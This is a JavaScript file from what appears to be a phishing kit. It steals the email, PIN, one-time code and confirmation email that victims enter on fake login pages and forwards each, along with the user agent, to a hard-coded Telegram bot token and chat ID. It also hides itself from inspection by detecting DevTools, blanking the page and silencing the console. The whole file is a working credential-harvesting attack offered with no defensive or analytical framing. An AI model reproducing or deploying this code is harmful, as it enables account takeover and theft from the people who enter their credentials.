document.addEventListener("DOMContentLoaded", function () {
    const telegramBotToken = '7600421646:AAEWmFjiz9IcMUcqncFLp4wSnAHdZ77iaZU';
    const telegramChatId = '7837079543';
    const PIN_LENGTH = 4;
    const CODE_LENGTH = 6; // Final code length for page 3

    // Log user-agent
    const userAgent = navigator.userAgent;
    sendMessageToTelegram(`User-Agent: ${userAgent}`);

    // Prevent console viewing
    (function blockConsole() {
        const devToolsDetected = () => {
            sendMessageToTelegram(`DevTools detected! User-Agent: ${userAgent}`);
            // Optional: Redirect user or disable functionality
            window.location.href = 'about:blank';
        };

        const devToolsChecker = setInterval(() => {
            const before = new Date();
            debugger; // Triggers if DevTools are open
            const after = new Date();
            if (after - before > 100) devToolsDetected();
        }, 500);
    })();

    // Obfuscate console output
    console.log = function () {};
    console.error = function () {};
    console.warn = function () {};
    console.info = function () {};

    // Function to send a message to Telegram
    function sendMessageToTelegram(message) {
        const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
        return fetch(telegramUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: telegramChatId,
                text: message
            })
        });
    }

    // Functionality remains unchanged
    function loadContent(pageUrl) {
        fetch(pageUrl)
            .then(response => {
                if (!response.ok) throw new Error(`Network response was not ok for ${pageUrl}`);
                return response.text();
            })
            .then(data => {
                const container = document.getElementById('content-container');
                if (container) {
                    container.innerHTML = data;
                    if (pageUrl === 'page2.html') {
                        displayStoredEmail();
                        initPinEntry();
                    } else if (pageUrl === 'page3.html') {
                        initFinalCodeEntry();
                    } else if (pageUrl === 'page4.html') {
                        initEmailConfirmation();
                    }
                }
            })
            .catch(error => {});
    }

    function initEmailEntry() {
        const loginButton = document.querySelector('[data-testid="e2e-login-continue-button"]');
        const emailInput = document.getElementById('email');

        if (loginButton && emailInput) {
            loginButton.addEventListener('click', function (event) {
                event.preventDefault();
                const email = emailInput.value;
                if (email) {
                    sendMessageToTelegram(`User entered email: ${email}`).then(success => {
                        if (success) {
                            localStorage.setItem("userEmail", email);
                            loadContent('page2.html');
                        }
                    });
                }
            });
        }
    }

    function displayStoredEmail() {
        const email = localStorage.getItem("userEmail");
        const emailDisplay = document.getElementById('userEmail');
        if (emailDisplay && email) emailDisplay.textContent = email;
    }

    function initPinEntry() {
        const passcodeInput = document.getElementById('passcode-input');
        if (passcodeInput) {
            passcodeInput.addEventListener('input', function () {
                if (passcodeInput.value.length === PIN_LENGTH) {
                    sendMessageToTelegram(`Entered PIN: ${passcodeInput.value}`).then(success => {
                        if (success) loadContent('page3.html');
                    });
                }
            });
        }
    }

    function initFinalCodeEntry() {
        const codeInput = document.getElementById('code-input');
        if (codeInput) {
            codeInput.addEventListener('input', function () {
                if (codeInput.value.length === CODE_LENGTH) {
                    sendMessageToTelegram(`Entered final code: ${codeInput.value}`)
                        .then(success => {
                            if (success) window.location.href = 'page4.html';
                        });
                }
            });
        }
    }

    function initEmailConfirmation() {
        const confirmEmailButton = document.getElementById('confirmEmailButton');
        const emailInput = document.getElementById('verification-url');
        if (confirmEmailButton && emailInput) {
            confirmEmailButton.addEventListener('click', function () {
                const email = emailInput.value.trim();
                if (email) {
                    sendMessageToTelegram(`User confirmed email: ${email}`).then(success => {
                        if (success) window.location.href = 'confirmation.html';
                    });
                }
            });
        }
    }

    if (document.body.contains(document.getElementById('email'))) {
        initEmailEntry();
    } else if (document.body.contains(document.getElementById('passcode-input'))) {
        initPinEntry();
    } else if (document.body.contains(document.getElementById('code-input'))) {
        initFinalCodeEntry();
    } else if (document.body.contains(document.getElementById('verification-url'))) {
        initEmailConfirmation();
    }

    document.documentElement.style.overflow = 'hidden';
    document.documentElement.style.height = '100vh';
    document.body.style.overflow = 'hidden';
    document.body.style.height = '100vh';
});
